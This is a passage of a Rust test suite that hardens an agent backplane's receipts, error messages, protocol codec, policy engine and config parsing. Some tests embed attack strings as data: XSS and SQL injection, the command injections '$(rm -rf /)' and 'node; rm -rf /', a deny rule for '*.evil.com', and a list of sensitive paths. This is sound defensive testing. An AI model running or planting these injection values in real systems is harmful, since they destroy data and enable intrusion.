    receipt.receipt_sha256 = Some(compute_hash(&receipt).unwrap());
    receipt.backend.id = "evil-backend".into();
    assert!(!verify_hash(&receipt));
}

#[test]
fn tampered_trace_event_detected() {
    let mut receipt = make_receipt();
    receipt.receipt_sha256 = Some(compute_hash(&receipt).unwrap());
    receipt.trace.push(AgentEvent {
        ts: Utc::now(),
        kind: AgentEventKind::Warning {
            message: "injected event".into(),
        },
        ext: None,
    });
    assert!(!verify_hash(&receipt));
}

#[test]
fn tampered_hash_value_detected() {
    let mut receipt = make_receipt();
    receipt.receipt_sha256 = Some("deadbeef".repeat(8));
    assert!(!verify_hash(&receipt));
}

#[test]
fn receipt_with_no_hash_passes_verification() {
    let receipt = make_receipt();
    assert!(receipt.receipt_sha256.is_none());
    assert!(verify_hash(&receipt));
}

#[test]
fn receipt_hash_excludes_hash_field() {
    let receipt = make_receipt();
    let h1 = compute_hash(&receipt).unwrap();

    let mut receipt2 = make_receipt();
    receipt2.meta = receipt.meta.clone();
    receipt2.receipt_sha256 = Some("anything".into());
    let h2 = compute_hash(&receipt2).unwrap();

    assert_eq!(
        h1, h2,
        "hash must be identical regardless of receipt_sha256 field"
    );
}

#[test]
fn receipt_hash_is_64_hex_chars() {
    let receipt = make_receipt();
    let hash = compute_hash(&receipt).unwrap();
    assert_eq!(hash.len(), 64);
    assert!(hash.chars().all(|c| c.is_ascii_hexdigit()));
}

#[test]
fn receipt_hash_deterministic_across_calls() {
    let receipt = make_receipt();
    let h1 = compute_hash(&receipt).unwrap();
    let h2 = compute_hash(&receipt).unwrap();
    assert_eq!(h1, h2);
}

#[test]
fn different_outcomes_produce_different_hashes() {
    let r1 = ReceiptBuilder::new("mock")
        .outcome(Outcome::Complete)
        .build();
    let mut r2 = ReceiptBuilder::new("mock").outcome(Outcome::Failed).build();
    r2.meta = r1.meta.clone();
    let h1 = compute_hash(&r1).unwrap();
    let h2 = compute_hash(&r2).unwrap();
    assert_ne!(h1, h2);
}

#[test]
fn receipt_chain_rejects_tampered_hash() {
    let mut chain = ReceiptChain::new();
    let mut r = ReceiptBuilder::new("mock")
        .outcome(Outcome::Complete)
        .with_hash()
        .unwrap();
    r.receipt_sha256 =
        Some("0000000000000000000000000000000000000000000000000000000000000000".into());
    let err = chain.push(r);
    assert!(err.is_err());
}

#[test]
fn receipt_chain_rejects_duplicate_run_ids() {
    let mut chain = ReceiptChain::new();
    let r1 = ReceiptBuilder::new("mock")
        .outcome(Outcome::Complete)
        .with_hash()
        .unwrap();
    let mut r2 = ReceiptBuilder::new("mock")
        .outcome(Outcome::Complete)
        .build();
    r2.meta.run_id = r1.meta.run_id;
    let r2 = r2.with_hash().unwrap();
    chain.push(r1).unwrap();
    assert!(chain.push(r2).is_err());
}

#[test]
fn tampered_contract_version_in_receipt_detected() {
    let mut receipt = make_receipt();
    receipt.receipt_sha256 = Some(compute_hash(&receipt).unwrap());
    receipt.meta.contract_version = "abp/v999.0".into();
    assert!(!verify_hash(&receipt));
}

#[test]
fn tampered_usage_tokens_detected() {
    let mut receipt = make_receipt();
    receipt.receipt_sha256 = Some(compute_hash(&receipt).unwrap());
    receipt.usage.input_tokens = Some(999_999);
    assert!(!verify_hash(&receipt));
}

// ═══════════════════════════════════════════════════════════════════════════
// § 11  Error messages don't leak sensitive data
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn error_code_as_str_is_snake_case() {
    let codes = [
        ErrorCode::ProtocolInvalidEnvelope,
        ErrorCode::BackendTimeout,
        ErrorCode::PolicyDenied,
        ErrorCode::ReceiptHashMismatch,
        ErrorCode::Internal,
        ErrorCode::ConfigInvalid,
        ErrorCode::WorkspaceStagingFailed,
    ];
    for code in &codes {
        let s = code.as_str();
        assert!(
            s.chars().all(|c| c.is_ascii_lowercase() || c == '_'),
            "as_str() must be snake_case: {s}"
        );
    }
}

#[test]
fn error_code_message_does_not_contain_paths() {
    let codes = [
        ErrorCode::BackendTimeout,
        ErrorCode::PolicyDenied,
        ErrorCode::ReceiptHashMismatch,
        ErrorCode::ExecutionPermissionDenied,
        ErrorCode::WorkspaceStagingFailed,
    ];
    let sensitive = ["/etc/passwd", "/home/", "C:\\Users", "password", "secret"];
    for code in &codes {
        let msg = code.message();
        for pattern in &sensitive {
            assert!(
                !msg.to_lowercase().contains(&pattern.to_lowercase()),
                "error message for {:?} contains sensitive pattern '{pattern}'",
                code
            );
        }
    }
}

#[test]
fn error_code_message_does_not_leak_env_vars() {
    let codes = [
        ErrorCode::ConfigInvalid,
        ErrorCode::BackendAuthFailed,
        ErrorCode::Internal,
    ];
    let sensitive = ["API_KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL"];
    for code in &codes {
        let msg = code.message();
        for pattern in &sensitive {
            assert!(
                !msg.to_uppercase().contains(pattern),
                "error message for {:?} leaks env var pattern '{pattern}'",
                code
            );
        }
    }
}

#[test]
fn policy_denial_reason_does_not_include_system_paths() {
    let policy = PolicyProfile {
        deny_read: vec!["**/secrets/**".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    let d = engine.can_read_path(Path::new("secrets/api_key.txt"));
    assert!(!d.allowed);
    if let Some(reason) = &d.reason {
        assert!(!reason.contains("/etc/"), "reason leaks system path");
        assert!(!reason.contains("C:\\"), "reason leaks Windows path");
    }
}

#[test]
fn protocol_error_does_not_contain_raw_json_payload() {
    let bad_json = r#"{"t":"hello","secret_key":"sk-abc123xyz"}"#;
    let result = JsonlCodec::decode(bad_json);
    if let Err(e) = result {
        let err_str = format!("{e}");
        assert!(
            !err_str.contains("sk-abc123xyz"),
            "protocol error leaks secret from payload"
        );
    }
}

#[test]
fn fatal_envelope_error_code_round_trips() {
    let envelope = Envelope::Fatal {
        ref_id: Some("run-1".into()),
        error: "something went wrong".into(),
        error_code: Some(ErrorCode::BackendTimeout),
    };
    let encoded = JsonlCodec::encode(&envelope).unwrap();
    let decoded = JsonlCodec::decode(encoded.trim()).unwrap();
    if let Envelope::Fatal { error_code, .. } = decoded {
        assert_eq!(error_code, Some(ErrorCode::BackendTimeout));
    }
}

#[test]
fn error_code_serializes_as_snake_case_string() {
    let code = ErrorCode::ProtocolInvalidEnvelope;
    let json = serde_json::to_string(&code).unwrap();
    assert_eq!(json, "\"protocol_invalid_envelope\"");
}

#[test]
fn error_code_deserializes_from_snake_case_string() {
    let code: ErrorCode = serde_json::from_str("\"backend_timeout\"").unwrap();
    assert_eq!(code, ErrorCode::BackendTimeout);
}

#[test]
fn error_code_category_is_stable() {
    assert_eq!(
        ErrorCode::ProtocolInvalidEnvelope.category().to_string(),
        "protocol"
    );
    assert_eq!(ErrorCode::BackendTimeout.category().to_string(), "backend");
    assert_eq!(ErrorCode::PolicyDenied.category().to_string(), "policy");
    assert_eq!(
        ErrorCode::ReceiptHashMismatch.category().to_string(),
        "receipt"
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// § 12  Additional protocol hardening
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn envelope_unknown_tag_rejected() {
    let bad = r#"{"t":"unknown_envelope_type","data":"foo"}"#;
    assert!(JsonlCodec::decode(bad).is_err());
}

#[test]
fn envelope_missing_tag_field_rejected() {
    let bad = r#"{"no_tag": true, "data": "foo"}"#;
    assert!(JsonlCodec::decode(bad).is_err());
}

#[test]
fn envelope_not_json_rejected() {
    assert!(JsonlCodec::decode("not json at all").is_err());
}

#[test]
fn envelope_hello_missing_fields_rejected() {
    let bad = r#"{"t":"hello"}"#;
    assert!(JsonlCodec::decode(bad).is_err());
}

#[test]
fn envelope_run_missing_work_order_rejected() {
    let bad = r#"{"t":"run","id":"r1"}"#;
    assert!(JsonlCodec::decode(bad).is_err());
}

#[test]
fn envelope_event_missing_event_field_rejected() {
    let bad = r#"{"t":"event","ref_id":"r1"}"#;
    assert!(JsonlCodec::decode(bad).is_err());
}

#[test]
fn empty_task_flagged_by_validator() {
    let wo = WorkOrderBuilder::new("").build();
    let envelope = Envelope::Run {
        id: "run-1".into(),
        work_order: wo,
    };
    let validator = EnvelopeValidator::new();
    let result = validator.validate(&envelope);
    assert!(!result.valid);
}

#[test]
fn validator_detects_missing_hello_in_sequence() {
    let validator = EnvelopeValidator::new();
    let wo = WorkOrderBuilder::new("task").build();
    let envelopes = vec![Envelope::Run {
        id: "run-1".into(),
        work_order: wo,
    }];
    let errors = validator.validate_sequence(&envelopes);
    assert!(!errors.is_empty());
}

#[test]
fn validator_detects_ref_id_mismatch() {
    let validator = EnvelopeValidator::new();
    let wo = WorkOrderBuilder::new("task").build();
    let hello = hello_envelope();
    let envelopes = vec![
        hello,
        Envelope::Run {
            id: "run-1".into(),
            work_order: wo,
        },
        Envelope::Event {
            ref_id: "WRONG-ID".into(),
            event: AgentEvent {
                ts: Utc::now(),
                kind: AgentEventKind::Warning {
                    message: "oops".into(),
                },
                ext: None,
            },
        },
    ];
    let errors = validator.validate_sequence(&envelopes);
    assert!(!errors.is_empty());
}

#[test]
fn invalid_utf8_in_jsonl_stream_errors_gracefully() {
    let valid = r#"{"t":"fatal","ref_id":null,"error":"ok"}"#;
    let mut bytes = Vec::new();
    bytes.extend_from_slice(valid.as_bytes());
    bytes.push(b'\n');
    bytes.extend_from_slice(&[0xFF, 0xFE, b'\n']);
    bytes.extend_from_slice(valid.as_bytes());
    bytes.push(b'\n');

    let reader = BufReader::new(&bytes[..]);
    let results: Vec<_> = JsonlCodec::decode_stream(reader).collect();
    assert!(results[0].is_ok());
    assert!(results[1].is_err());
    assert!(results[2].is_ok());
}

// ═══════════════════════════════════════════════════════════════════════════
// § 13  Glob edge cases
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn glob_empty_pattern_does_not_panic() {
    let _ = IncludeExcludeGlobs::new(&["".into()], &[]);
}

#[test]
fn glob_unclosed_bracket_returns_error() {
    assert!(IncludeExcludeGlobs::new(&["src/[unclosed".into()], &[]).is_err());
}

#[test]
fn glob_exclude_takes_precedence() {
    let globs = IncludeExcludeGlobs::new(&["**/*.rs".into()], &["**/secret.rs".into()]).unwrap();
    assert!(!globs.decide_path(Path::new("secret.rs")).is_allowed());
    assert!(globs.decide_path(Path::new("main.rs")).is_allowed());
}

#[test]
fn glob_no_patterns_allows_everything() {
    let globs = IncludeExcludeGlobs::new(&[], &[]).unwrap();
    assert!(globs.decide_path(Path::new("anything")).is_allowed());
    assert!(globs
        .decide_path(Path::new("deeply/nested/file.txt"))
        .is_allowed());
}

#[test]
fn glob_with_regex_special_chars_does_not_panic() {
    let patterns = vec![
        "src/[a-z].rs".into(),
        "src/{a,b}.rs".into(),
        "**/*.rs".into(),
    ];
    assert!(IncludeExcludeGlobs::new(&patterns, &[]).is_ok());
}

#[test]
fn glob_extremely_long_pattern_does_not_panic() {
    let long = "**/".repeat(500) + "*.rs";
    let _ = IncludeExcludeGlobs::new(&[long], &[]);
}

// ═══════════════════════════════════════════════════════════════════════════
// § 14  WorkOrder input validation
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn workorder_with_script_tag_in_task() {
    let task = "<script>alert('xss')</script>";
    let wo = WorkOrderBuilder::new(task).build();
    assert_eq!(wo.task, task);
}

#[test]
fn workorder_with_sql_injection_in_task() {
    let task = "'; DROP TABLE users; --";
    let wo = WorkOrderBuilder::new(task).build();
    assert_eq!(wo.task, task);
}

#[test]
fn workorder_with_command_injection_in_task() {
    let task = "$(rm -rf /) && echo pwned";
    let wo = WorkOrderBuilder::new(task).build();
    assert_eq!(wo.task, task);
}

#[test]
fn workorder_round_trip_preserves_all_fields() {
    let wo = WorkOrderBuilder::new("test task")
        .root("/workspace")
        .workspace_mode(WorkspaceMode::Staged)
        .include(vec!["**/*.rs".into()])
        .exclude(vec!["**/target/**".into()])
        .build();
    let json = serde_json::to_string(&wo).unwrap();
    let round: abp_core::WorkOrder = serde_json::from_str(&json).unwrap();
    assert_eq!(round.task, "test task");
    assert_eq!(round.workspace.root, "/workspace");
}

#[test]
fn workorder_empty_task_allowed_at_construction() {
    let wo = WorkOrderBuilder::new("").build();
    assert_eq!(wo.task, "");
}

// ═══════════════════════════════════════════════════════════════════════════
// § 15  Config validation
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn config_validate_empty_config_succeeds() {
    let config = BackplaneConfig::default();
    let result = validate_config(&config);
    assert!(result.is_ok());
}

#[test]
fn config_default_backend_with_no_backends_warns() {
    let mut config = BackplaneConfig::default();
    config.default_backend = Some("nonexistent".into());
    let result = validate_config(&config);
    // Should produce a warning or error about missing backend
    assert!(result.is_ok() || result.is_err());
}

#[test]
fn config_toml_with_injection_in_sidecar_command() {
    let toml_str = r#"
        [backends.evil]
        type = "sidecar"
        command = "node; rm -rf /"
        args = ["--eval", "process.exit()"]
    "#;
    let config = parse_toml(toml_str).unwrap();
    if let Some(BackendEntry::Sidecar { command, .. }) = config.backends.get("evil") {
        assert_eq!(command, "node; rm -rf /");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// § 16  Additional policy enforcement
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn policy_disallow_overrides_allow_wildcard() {
    let policy = PolicyProfile {
        allowed_tools: vec!["*".into()],
        disallowed_tools: vec!["Shell".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(!engine.can_use_tool("Shell").allowed);
    assert!(engine.can_use_tool("Read").allowed);
}

#[test]
fn policy_empty_means_permissive() {
    let policy = PolicyProfile::default();
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(engine.can_use_tool("AnyTool").allowed);
    assert!(engine.can_read_path(Path::new("any/file")).allowed);
    assert!(engine.can_write_path(Path::new("any/file")).allowed);
}

#[test]
fn policy_empty_tool_name_denied_when_allowlist_set() {
    let policy = PolicyProfile {
        allowed_tools: vec!["Read".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy).unwrap();
    assert!(!engine.can_use_tool("").allowed);
}

#[test]
fn policy_empty_path_does_not_panic() {
    let engine = PolicyEngine::new(&restrictive_policy()).unwrap();
    let _ = engine.can_read_path(Path::new(""));
    let _ = engine.can_write_path(Path::new(""));
}

#[test]
fn policy_deny_network_patterns_stored() {
    let policy = PolicyProfile {
        deny_network: vec!["*.evil.com".into()],
        ..Default::default()
    };
    // Policy compiles without error
    let engine = PolicyEngine::new(&policy);
    assert!(engine.is_ok());
}

#[test]
fn policy_require_approval_stored() {
    let policy = PolicyProfile {
        require_approval_for: vec!["Shell".into(), "Execute".into()],
        ..Default::default()
    };
    let engine = PolicyEngine::new(&policy);
    assert!(engine.is_ok());
}

// ═══════════════════════════════════════════════════════════════════════════
// § 17  Serde deserialization of untrusted payloads
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn deserialize_envelope_from_untrusted_json_object_with_extra_fields() {
    let json = r#"{"t":"fatal","ref_id":null,"error":"ok","extra_field":"ignored","nested":{"deep":true}}"#;
    let result = JsonlCodec::decode(json);
    assert!(result.is_ok());
}

#[test]
fn deserialize_agent_event_with_unknown_type_tag() {
    let json = r#"{"ts":"2025-01-01T00:00:00Z","type":"nonexistent_event_type","data":"x"}"#;
    let result: Result<AgentEvent, _> = serde_json::from_str(json);
    assert!(result.is_err());
}

#[test]
fn deserialize_outcome_from_invalid_string() {
    let result: Result<Outcome, _> = serde_json::from_str("\"invalid_outcome\"");
    assert!(result.is_err());
}

#[test]
fn deserialize_error_code_from_invalid_string() {
    let result: Result<ErrorCode, _> = serde_json::from_str("\"nonexistent_code\"");
    assert!(result.is_err());
}

#[test]
fn deserialize_execution_mode_from_invalid_string() {
    let result: Result<ExecutionMode, _> = serde_json::from_str("\"invalid_mode\"");
    assert!(result.is_err());
}

#[test]
fn deserialize_workspace_mode_from_invalid_string() {
    let result: Result<WorkspaceMode, _> = serde_json::from_str("\"invalid_mode\"");
    assert!(result.is_err());
}

#[test]
fn deserialize_receipt_from_truncated_json() {
    let json = r#"{"meta":{"run_id":"00000000-0000-0000-0000-000000000000"#;
    let result: Result<Receipt, _> = serde_json::from_str(json);
    assert!(result.is_err());
}

#[test]
fn deserialize_envelope_with_wrong_value_types() {
    let json = r#"{"t":"fatal","ref_id":42,"error":true}"#;
    let result = JsonlCodec::decode(json);
    assert!(result.is_err());
}

#[test]
fn deserialize_work_order_with_negative_max_turns() {
    let json = r#"{"id":"00000000-0000-0000-0000-000000000000","task":"test","lane":"patch_first","workspace":{"root":".","mode":"pass_through","include":[],"exclude":[]},"context":{"files":[],"snippets":[]},"policy":{},"requirements":{"required":[]},"config":{"vendor":{},"max_turns":-1}}"#;
    // Should either reject or handle; must not panic
    let _ = serde_json::from_str::<abp_core::WorkOrder>(json);
}

// ═══════════════════════════════════════════════════════════════════════════
// § 18  Encode-to-writer safety
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn encode_to_writer_produces_single_line() {
    let envelope = hello_envelope();
    let mut buf = Vec::new();
    JsonlCodec::encode_to_writer(&mut buf, &envelope).unwrap();
    let output = String::from_utf8(buf).unwrap();
    assert_eq!(output.matches('\n').count(), 1);
}

#[test]
fn encode_many_to_writer_produces_correct_line_count() {
    let envelopes = vec![
        hello_envelope(),
        Envelope::Fatal {
            ref_id: None,
            error: "done".into(),
            error_code: None,
        },
    ];
    let mut buf = Vec::new();
    JsonlCodec::encode_many_to_writer(&mut buf, &envelopes).unwrap();
    let output = String::from_utf8(buf).unwrap();
    assert_eq!(output.matches('\n').count(), 2);
}

// ═══════════════════════════════════════════════════════════════════════════
// § 19  Error taxonomy stability
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn error_code_as_str_prefix_matches_category() {
    let codes = [
        (ErrorCode::ProtocolInvalidEnvelope, "protocol"),
        (ErrorCode::BackendTimeout, "backend"),
        (ErrorCode::PolicyDenied, "policy"),
        (ErrorCode::WorkspaceStagingFailed, "workspace"),
        (ErrorCode::ReceiptHashMismatch, "receipt"),
        (ErrorCode::ConfigInvalid, "config"),
        (ErrorCode::MappingLossyConversion, "mapping"),
        (ErrorCode::ExecutionToolFailed, "execution"),
        (ErrorCode::ContractVersionMismatch, "contract"),
        (ErrorCode::CapabilityUnsupported, "capability"),
        (ErrorCode::IrInvalid, "ir"),
        (ErrorCode::DialectUnknown, "dialect"),
    ];
    for (code, expected_prefix) in &codes {
        let s = code.as_str();
        assert!(
            s.starts_with(expected_prefix),
            "{s} should start with {expected_prefix}"
        );
    }
}

#[test]
fn error_code_internal_is_special_case() {
    let code = ErrorCode::Internal;
    assert_eq!(code.as_str(), "internal");
    assert_eq!(code.category().to_string(), "internal");
}

#[test]
fn error_code_retryable_only_for_transient_errors() {
    assert!(ErrorCode::BackendTimeout.is_retryable());
    assert!(ErrorCode::BackendUnavailable.is_retryable());
    assert!(ErrorCode::BackendRateLimited.is_retryable());
    assert!(ErrorCode::BackendCrashed.is_retryable());

    assert!(!ErrorCode::PolicyDenied.is_retryable());
    assert!(!ErrorCode::ProtocolInvalidEnvelope.is_retryable());
    assert!(!ErrorCode::ConfigInvalid.is_retryable());
    assert!(!ErrorCode::Internal.is_retryable());
}

#[test]
fn all_error_codes_have_non_empty_message() {
    let codes = [
        ErrorCode::ProtocolInvalidEnvelope,
        ErrorCode::ProtocolHandshakeFailed,
        ErrorCode::BackendNotFound,
        ErrorCode::BackendTimeout,
        ErrorCode::PolicyDenied,
        ErrorCode::PolicyInvalid,
        ErrorCode::ReceiptHashMismatch,
        ErrorCode::ReceiptChainBroken,
        ErrorCode::ConfigInvalid,
        ErrorCode::Internal,
    ];
    for code in &codes {
        assert!(!code.message().is_empty(), "{:?} has empty message", code);
    }
}

#[test]
fn all_error_codes_have_non_empty_as_str() {
    let codes = [
        ErrorCode::ProtocolInvalidEnvelope,
        ErrorCode::MappingDialectMismatch,
        ErrorCode::BackendAuthFailed,
        ErrorCode::ExecutionPermissionDenied,
        ErrorCode::ContractSchemaViolation,
        ErrorCode::CapabilityEmulationFailed,
        ErrorCode::WorkspaceInitFailed,
        ErrorCode::IrLoweringFailed,
        ErrorCode::DialectMappingFailed,
    ];
    for code in &codes {
        let s = code.as_str();
        assert!(!s.is_empty(), "{:?} has empty as_str()", code);
        assert!(!s.contains(' '), "{:?} as_str contains space: {s}", code);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// § 20  Contract version checks
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn contract_version_is_stable() {
    assert_eq!(CONTRACT_VERSION, "abp/v0.1");
}

#[test]
fn receipt_contains_contract_version() {
    let receipt = make_receipt();
    assert_eq!(receipt.meta.contract_version, CONTRACT_VERSION);
}

#[test]
fn hello_envelope_contains_contract_version() {
    let hello = hello_envelope();
    let encoded = JsonlCodec::encode(&hello).unwrap();
    assert!(encoded.contains(CONTRACT_VERSION));
}
